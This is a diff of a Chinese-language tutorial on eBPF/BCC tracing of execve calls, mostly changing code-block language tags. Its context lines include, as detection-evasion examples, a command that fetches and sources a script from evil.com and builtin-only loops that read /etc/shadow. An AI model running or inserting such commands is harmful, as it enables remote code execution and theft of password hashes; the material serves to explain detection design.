@@ -116,7 +116,7 @@ b.trace_print()                    # 4. 死循环读 trace_pipe，打印到屏�
 
 我们也可以单独开一个终端验证：
 
-```
+```bash
 sudo cat /sys/kernel/debug/tracing/trace_pipe
 ```
 
@@ -159,7 +159,7 @@ flowchart LR
 
 我们把内核态C代码写成如下样式：
 
-```bash
+```c
 BPF_HASH(counter_table);  // 1. 定义一个哈希表 map
 
 int hello(void *ctx) {
@@ -230,7 +230,7 @@ while True:  # 1
 
 下面是我自己运行代码的结果：
 
-```
+```bash
 ID 1000: 8        ← 第一次读取：UID 1000 已经调用了 8 次 execve
 ID 1000: 14       ← 第二次读取（2秒后）：已经 14 次了，说明这 2 秒内又执行了 6 个命令
 ID 1000: 14       ← 还是 14，说明这 2 秒内没有新的 execve
@@ -252,7 +252,7 @@ ID 1000: 19  ID 0: 8    ← root计数直接+6
 
 其中第1、2行的计数跳跃我推测为打开了一个新的终端，之后我分别执行了
 
-```
+```bash
 ls         3-4行计数+1
 sudo ls    6-10行，普通用户发起sudo请求+1，同时引入root用户
 sudo ls    13-14行，再次验证sudo的免密请求存在时间差
@@ -264,7 +264,7 @@ sudo su    15-16行，直接将当前终端升级为root会触发更多的execve
 
    `sudo su` 比普通 `sudo ls` 触发的 root execve 更多：
 
-   ```
+   ```bash
    sudo su 的完整流程：
    
    1. bash (UID 1000) → execve("sudo")      → UID 1000 +1
@@ -340,7 +340,7 @@ ID 1000: 16  ID 0: 2   ← 只知道"root 执行了 2 次"
 
 ##### 1st. 核心思路
 
-```
+```text
 内核态                              用户态
 ┌──────────┐                    ┌──────────────┐
 │ hello()  │  perf_submit()     │ 回调函数      │
@@ -512,9 +512,7 @@ while True:
 `open_perf_buffer` 把回调函数绑定到 perf buffer。
 `perf_buffer_poll` 阻塞等待事件，有事件就调回调，没有就等着。
 
-
-
-
+---
 
 #### Ring Buffer：BPF_RINGBUF_OUTPUT
 
@@ -617,7 +615,7 @@ while True:
 
 ##### 3rd. ringbuf_output 的第三个参数
 
-```
+```bash
 events.ringbuf_output(&data, sizeof(data), 0);
 //                                      ↑ flags
 // 0 = 正常提交
@@ -799,7 +797,7 @@ type echo
 
 攻击者可以完全不触发 `execve`，纯用内建命令完成很多操作：
 
-```
+```bash
 # 不触发任何 execve 的恶意操作链：
 cd /etc                    # 内建，无 execve
 while read line; do        # 内建，无 execve
@@ -809,7 +807,7 @@ done < shadow              # 重定向读取敏感文件
 
 更危险的是，如果攻击者拿到的是一个**受限 shell**，或者用 `source` 加载恶意脚本：
 
-```
+```bash
 # 下载恶意脚本并直接在当前 shell 执行
 source <(curl http://evil.com/payload.sh)
 # 或者
@@ -822,7 +820,7 @@ source <(curl http://evil.com/payload.sh)
 
 这就是计划里要搞多探针的原因：
 
-```
+```text
 ┌─────────────────────────────────────────────────┐
 │              攻击行为检测覆盖率                    │
 ├─────────────┬───────────────────────────────────┤
@@ -847,7 +845,7 @@ source <(curl http://evil.com/payload.sh)
 
 #实际例子：`cd /etc && cat shadow` 的完整检测
 
-```
+```bas
 攻击者输入：cd /etc && cat shadow
 
 execve 探针看到：
